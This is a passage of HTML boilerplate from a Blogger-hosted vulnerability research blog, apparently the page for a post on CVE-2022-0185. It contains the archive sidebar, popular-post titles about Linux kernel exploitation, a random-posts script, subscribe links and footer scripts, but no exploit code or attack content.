<a class='post-count-link' href='https://www.willsroot.io/2019/'>
2019
</a>
<span class='post-count' dir='ltr'>(19)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2019/11/'>
November
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2019/10/'>
October
</a>
<span class='post-count' dir='ltr'>(6)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2019/09/'>
September
</a>
<span class='post-count' dir='ltr'>(6)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2019/08/'>
August
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2019/06/'>
June
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2019/03/'>
March
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2016/'>
2016
</a>
<span class='post-count' dir='ltr'>(1)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2016/07/'>
July
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class='clear'></div>
</div>
</div><div class='widget FeaturedPost' data-version='1' id='FeaturedPost1'>
<h2 class='title'>Featured Post</h2>
<div class='post-summary'>
<h3><a href='https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html'>corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel</a></h3>
<p>
In corCTF 2021, D3v17  and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...
</p>
<img class='image' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhk7_f3cfmXJLNVS18Z4v30D8hMI069XR0flo8U79_0jCIA-KJVD7z4yo4eRPlqd1cvCJyGoVw4cPqL39nfJUqnROpHbr_fCeBmNUhVhyPicqcYZvWC-yMl-N5_fep_xuxmEP3xkXQD9MyH/w640-h409/1.png'/>
</div>
<style type='text/css'>
    .image {
      width: 100%;
    }
  </style>
<div class='clear'></div>
</div><div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
<h2>Popular Posts</h2>
<div class='widget-content popular-posts'>
<ul>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='https://www.willsroot.io/2022/01/cve-2022-0185.html' target='_blank'>
<img alt='' border='0' src='https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg=w72-h72-p-k-no-nu'/>
</a>
</div>
<div class='item-title'><a href='https://www.willsroot.io/2022/01/cve-2022-0185.html'>CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers</a></div>
<div class='item-snippet'>Recently, several friends on my CTF team Crusaders of Rust   and I found a Linux kernel heap overflow 0-day. We found the bug  through fuzzi...</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='https://www.willsroot.io/2022/12/entrybleed.html' target='_blank'>
<img alt='' border='0' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0aBNoBcKz3-EQBc9uoZOoiGZLiMgFXS-yElT8s7mlpjcsDi8JMGQ1dURbea3t0r1rQULWTPUpqUaTmWM1kV2kzoDzkRA-fdBKwIUBQWcR8nHkufKMc6ZzngZRyH_kFjao25jmPfSWu8YwOVICnHdTNOhKLY33Nnh1Qxv5NNhZDoKeIlLkA_W6aK3CJw/w72-h72-p-k-no-nu/demo.gif'/>
</a>
</div>
<div class='item-title'><a href='https://www.willsroot.io/2022/12/entrybleed.html'>EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)</a></div>
<div class='item-snippet'>Recently, I&#8217;ve discovered that Linux KPTI has implementation issues that can allow any unprivileged local attacker to bypass KASLR on  Intel...</div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-content'>
<div class='item-thumbnail'>
<a href='https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html' target='_blank'>
<img alt='' border='0' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhk7_f3cfmXJLNVS18Z4v30D8hMI069XR0flo8U79_0jCIA-KJVD7z4yo4eRPlqd1cvCJyGoVw4cPqL39nfJUqnROpHbr_fCeBmNUhVhyPicqcYZvWC-yMl-N5_fep_xuxmEP3xkXQD9MyH/w72-h72-p-k-no-nu/1.png'/>
</a>
</div>
<div class='item-title'><a href='https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html'>corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel</a></div>
<div class='item-snippet'>In corCTF 2021, D3v17  and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...</div>
</div>
<div style='clear: both;'></div>
</li>
</ul>
<div class='clear'></div>
</div>
</div><div class='widget HTML' data-version='1' id='HTML1'>
<h2 class='title'>Interesting Posts</h2>
<div class='widget-content'>
<style>
#random-posts img {
    border-radius: 10px;
    float: left;
    margin-right: 5px;
    width: 75px;
    height: 75px;
    transition: all 0.2s linear 0s;
}

#random-posts img:hover {
    opacity: 0.6;
}

ul#random-posts {
    list-style-type: none;
    padding: 0px;
}

#random-posts a {
    font-size: 15px;
    padding: 0px auto 5px;
}

#random-posts a:hover {
    text-decoration: none;
}

.random-summary {
    font-size: 11px;
    background: none;
    padding: 5px;
    margin-right: 8px;
}

#random-posts li {
    margin-bottom: 10px;
    border-bottom: 1px solid #EEEEEE;
    padding: 4px;
}
</style>
<ul id='random-posts'>
<script type='text/javaScript'>
var randomposts_number = 6;
var randomposts_chars = 110;
var randomposts_details = 'yes';
var randomposts_comments = 'Comments';
var randomposts_commentsd = 'Comments Disabled';
var randomposts_current = [];
var total_randomposts = 0;
var randomposts_current = new Array(randomposts_number);

function randomposts(json) {
    total_randomposts = json.feed.openSearch$totalResults.$t
}
document.write('<script type=\"text/javascript\" src=\"/feeds/posts/default?alt=json-in-script&max-results=0&callback=randomposts\"><\/script>');

function getvalue() {
    for (var i = 0; i < randomposts_number; i++) {
        var found = false;
        var rndValue = get_random();
        for (var j = 0; j < randomposts_current.length; j++) {
            if (randomposts_current[j] == rndValue) {
                found = true;
                break
            }
        };
        if (found) {
            i--
        } else {
            randomposts_current[i] = rndValue
        }
    }
};

function get_random() {
    var ranNum = 1 + Math.round(Math.random() * (total_randomposts - 1));
    return ranNum
};
</script>
<script type='text/javaScript'> 
function random_posts(json) {
    for (var i = 0; i < randomposts_number; i++) {
        var entry = json.feed.entry[i];
        var randompoststitle = entry.title.$t;
        if ('content' in entry) {
            var randompostsnippet = entry.content.$t
        } else {
            if ('summary' in entry) {
                var randompostsnippet = entry.summary.$t
            } else {
                var randompostsnippet = "";
            }
        };
        randompostsnippet = randompostsnippet.replace(/<[^>]*>/g, "");
        if (randompostsnippet.length < randomposts_chars) {
            var randomposts_snippet = randompostsnippet
        } else {
            randompostsnippet = randompostsnippet.substring(0, randomposts_chars);
            var whitespace = randompostsnippet.lastIndexOf(" ");
            randomposts_snippet = randompostsnippet.substring(0, whitespace) + "&#133;";
        };
        for (var j = 0; j < entry.link.length; j++) {
            if ('thr$total' in entry) {
                var randomposts_commentsnum = entry.thr$total.$t + ' ' + randomposts_comments
            } else {
                randomposts_commentsnum = randomposts_commentsd
            }; if (entry.link[j].rel == 'alternate') {
                var randompostsurl = entry.link[j].href;
                var randomposts_date = entry.published.$t;
                if ('media$thumbnail' in entry) {
                    var randompoststhumb = entry.media$thumbnail.url
                } else {
                    randompoststhumb = "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEge2MCWyMqG7cMJlr53KZygzYRYJHA90UmBywZPqMRpciNkZy_M8Hfx__-mTv6If5m0fnTZowsyvGZ141DapRN6FMDjnCQVnL4t02GYBmjGqUExnsz0tLJUFf2n6okR_w_dnvpqpfe-2FMB/s1057/COOL+AUDIO+WAVES-for-blog.jpg"
                }
            }
        };
        document.write('<li>');
        document.write('<a href="' + randompostsurl + '" rel="nofollow"><img alt="' + randompoststitle + '" src="' + randompoststhumb + '"/></a>');
        document.write('<div><a href="' + randompostsurl + '" rel="nofollow">' + randompoststitle + '</a></div>');
        if (randomposts_details == 'yes') {
            document.write('<span><div  class="random-info">' + randomposts_date.substring(8, 10) + '.' + randomposts_date.substring(5, 7) + '.' + randomposts_date.substring(0, 4) + ' - ' + randomposts_commentsnum) + '</div></span>'
        };
        document.write('<br/><div class="random-summary">' + randomposts_snippet + '</div><div style="clear:both"></div></li>')
    }
};
getvalue();
for (var i = 0; i < randomposts_number; i++) {
    document.write('<script type=\"text/javascript\" src=\"/feeds/posts/default?alt=json-in-script&start-index=' + randomposts_current[i] + '&max-results=1&callback=random_posts\"><\/script>')
};
</script>
</ul>
</div>
<div class='clear'></div>
</div><div class='widget Subscribe' data-version='1' id='Subscribe1'>
<div style='white-space:nowrap'>
<h2 class='title'>Subscribe To This Blog</h2>
<div class='widget-content'>
<div class='subscribe-wrapper subscribe-type-POST'>
<div class='subscribe expanded subscribe-type-POST' id='SW_READER_LIST_Subscribe1POST' style='display:none;'>
<div class='top'>
<span class='inner' onclick='return(_SW_toggleReaderList(event, "Subscribe1POST"));'>
<img class='subscribe-dropdown-arrow' src='https://resources.blogblog.com/img/widgets/arrow_dropdown.gif'/>
<img align='absmiddle' alt='' border='0' class='feed-icon' src='https://resources.blogblog.com/img/icon_feed12.png'/>
Posts
</span>
<div class='feed-reader-links'>
<a class='feed-reader-link' href='https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2Fposts%2Fdefault' target='_blank'>
<img src='https://resources.blogblog.com/img/widgets/subscribe-netvibes.png'/>
</a>
<a class='feed-reader-link' href='https://add.my.yahoo.com/content?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2Fposts%2Fdefault' target='_blank'>
<img src='https://resources.blogblog.com/img/widgets/subscribe-yahoo.png'/>
</a>
<a class='feed-reader-link' href='https://www.willsroot.io/feeds/posts/default' target='_blank'>
<img align='absmiddle' class='feed-icon' src='https://resources.blogblog.com/img/icon_feed12.png'/>
                  Atom
                </a>
</div>
</div>
<div class='bottom'></div>
</div>
<div class='subscribe' id='SW_READER_LIST_CLOSED_Subscribe1POST' onclick='return(_SW_toggleReaderList(event, "Subscribe1POST"));'>
<div class='top'>
<span class='inner'>
<img class='subscribe-dropdown-arrow' src='https://resources.blogblog.com/img/widgets/arrow_dropdown.gif'/>
<span onclick='return(_SW_toggleReaderList(event, "Subscribe1POST"));'>
<img align='absmiddle' alt='' border='0' class='feed-icon' src='https://resources.blogblog.com/img/icon_feed12.png'/>
Posts
</span>
</span>
</div>
<div class='bottom'></div>
</div>
</div>
<div class='subscribe-wrapper subscribe-type-PER_POST'>
<div class='subscribe expanded subscribe-type-PER_POST' id='SW_READER_LIST_Subscribe1PER_POST' style='display:none;'>
<div class='top'>
<span class='inner' onclick='return(_SW_toggleReaderList(event, "Subscribe1PER_POST"));'>
<img class='subscribe-dropdown-arrow' src='https://resources.blogblog.com/img/widgets/arrow_dropdown.gif'/>
<img align='absmiddle' alt='' border='0' class='feed-icon' src='https://resources.blogblog.com/img/icon_feed12.png'/>
Comments
</span>
<div class='feed-reader-links'>
<a class='feed-reader-link' href='https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2F8508102479187046073%2Fcomments%2Fdefault' target='_blank'>
<img src='https://resources.blogblog.com/img/widgets/subscribe-netvibes.png'/>
</a>
<a class='feed-reader-link' href='https://add.my.yahoo.com/content?url=https%3A%2F%2Fwww.willsroot.io%2Ffeeds%2F8508102479187046073%2Fcomments%2Fdefault' target='_blank'>
<img src='https://resources.blogblog.com/img/widgets/subscribe-yahoo.png'/>
</a>
<a class='feed-reader-link' href='https://www.willsroot.io/feeds/8508102479187046073/comments/default' target='_blank'>
<img align='absmiddle' class='feed-icon' src='https://resources.blogblog.com/img/icon_feed12.png'/>
                  Atom
                </a>
</div>
</div>
<div class='bottom'></div>
</div>
<div class='subscribe' id='SW_READER_LIST_CLOSED_Subscribe1PER_POST' onclick='return(_SW_toggleReaderList(event, "Subscribe1PER_POST"));'>
<div class='top'>
<span class='inner'>
<img class='subscribe-dropdown-arrow' src='https://resources.blogblog.com/img/widgets/arrow_dropdown.gif'/>
<span onclick='return(_SW_toggleReaderList(event, "Subscribe1PER_POST"));'>
<img align='absmiddle' alt='' border='0' class='feed-icon' src='https://resources.blogblog.com/img/icon_feed12.png'/>
Comments
</span>
</span>
</div>
<div class='bottom'></div>
</div>
</div>
<div style='clear:both'></div>
</div>
</div>
<div class='clear'></div>
</div></div>
</aside>
</div>
</div>
</div>
<div style='clear: both'></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class='main-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
<footer>
<div class='footer-outer'>
<div class='footer-cap-top cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left footer-fauxborder-left'>
<div class='fauxborder-right footer-fauxborder-right'></div>
<div class='region-inner footer-inner'>
<div class='foot no-items section' id='footer-1'></div>
<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
<tbody>
<tr>
<td class='first columns-cell'>
<div class='foot no-items section' id='footer-2-1'></div>
</td>
<td class='columns-cell'>
<div class='foot no-items section' id='footer-2-2'></div>
</td>
</tr>
</tbody>
</table>
<!-- outside of the include in order to lock Attribution widget -->
<div class='foot section' id='footer-3' name='Footer'><div class='widget Attribution' data-version='1' id='Attribution1'>
<div class='widget-content' style='text-align: center;'>
Picture Window theme. Powered by <a href='https://www.blogger.com' target='_blank'>Blogger</a>.
</div>
<div class='clear'></div>
</div></div>
</div>
</div>
<div class='footer-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class='content-cap-bottom cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<script type='text/javascript'>
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>
<!--It is your responsibility to notify your visitors about cookies used and data collected on your blog. Blogger makes a standard notification available for you to use on your blog, and you can customise it or replace it with your own notice. See http://www.blogger.com/go/cookiechoices for more details.-->
<script defer='' src='/js/cookienotice.js'></script>
<script>
    document.addEventListener('DOMContentLoaded', function(event) {
      window.cookieChoices && cookieChoices.showCookieConsentBar && cookieChoices.showCookieConsentBar(
          (window.cookieOptions && cookieOptions.msg) || 'This site uses cookies from Google to deliver its services and to analyse traffic. Your IP address and user agent are shared with Google, together with performance and security metrics, to ensure quality of service, generate usage statistics and to detect and address abuse.',
          (window.cookieOptions && cookieOptions.close) || 'Got it',
          (window.cookieOptions && cookieOptions.learn) || 'Learn more',
          (window.cookieOptions && cookieOptions.link) || 'https://www.blogger.com/go/blogspot-cookies');
    });
  </script>

<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/745881458-widgets.js"></script>
<script type='text/javascript'>
window['__wavt'] = 'AOuZoY4hARvKSbxySG57aBSHVOFtxnH1bQ:1736115027009';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d8814147965526194982','//www.willsroot.io/2022/01/cve-2022-0185.html','8814147965526194982');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '8814147965526194982', 'title': 'Will\x27s Root', 'url': 'https://www.willsroot.io/2022/01/cve-2022-0185.html', 'canonicalUrl': 'https://www.willsroot.io/2022/01/cve-2022-0185.html', 'homepageUrl': 'https://www.willsroot.io/', 'searchUrl': 'https://www.willsroot.io/search', 'canonicalHomepageUrl': 'https://www.willsroot.io/', 'blogspotFaviconUrl': 'https://www.willsroot.io/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Will\x26#39;s Root - Atom\x22 href\x3d\x22https://www.willsroot.io/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Will\x26#39;s Root - RSS\x22 href\x3d\x22https://www.willsroot.io/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Will\x26#39;s Root - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/8814147965526194982/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Will\x26#39;s Root - Atom\x22 href\x3d\x22https://www.willsroot.io/feeds/8508102479187046073/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/361ce9cf7a112c52', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Share to X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '8508102479187046073', 'postImageThumbnailUrl': 'https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg\x3ds72-w640-c-h344', 'postImageUrl': 'https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg\x3dw640-h344', 'pageName': 'CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google\x27s KCTF Containers', 'pageTitle': 'Will\x27s Root: CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google\x27s KCTF Containers', 'metaDescription': ''}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'Picture Window', 'localizedName': 'Picture Window', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': false, 'variant': 'shade', 'variantId': 'shade'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google\x27s KCTF Containers', 'description': 'Vulnerability Research on Low-Level Systems', 'featuredImage': 'https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg\x3dw640-h344', 'url': 'https://www.willsroot.io/2022/01/cve-2022-0185.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 8508102479187046073}}]);
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogSearchView', new _WidgetInfo('BlogSearch1', 'crosscol', document.getElementById('BlogSearch1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/3846405171-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/1964470060-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text1', 'sidebar-right-1', document.getElementById('Text1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML3', 'sidebar-right-1', document.getElementById('HTML3'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebar-right-1', document.getElementById('HTML2'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_FeaturedPostView', new _WidgetInfo('FeaturedPost1', 'sidebar-right-1', document.getElementById('FeaturedPost1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PopularPostsView', new _WidgetInfo('PopularPosts1', 'sidebar-right-1', document.getElementById('PopularPosts1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'sidebar-right-1', document.getElementById('HTML1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_SubscribeView', new _WidgetInfo('Subscribe1', 'sidebar-right-1', document.getElementById('Subscribe1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
</script>
</body>
</html>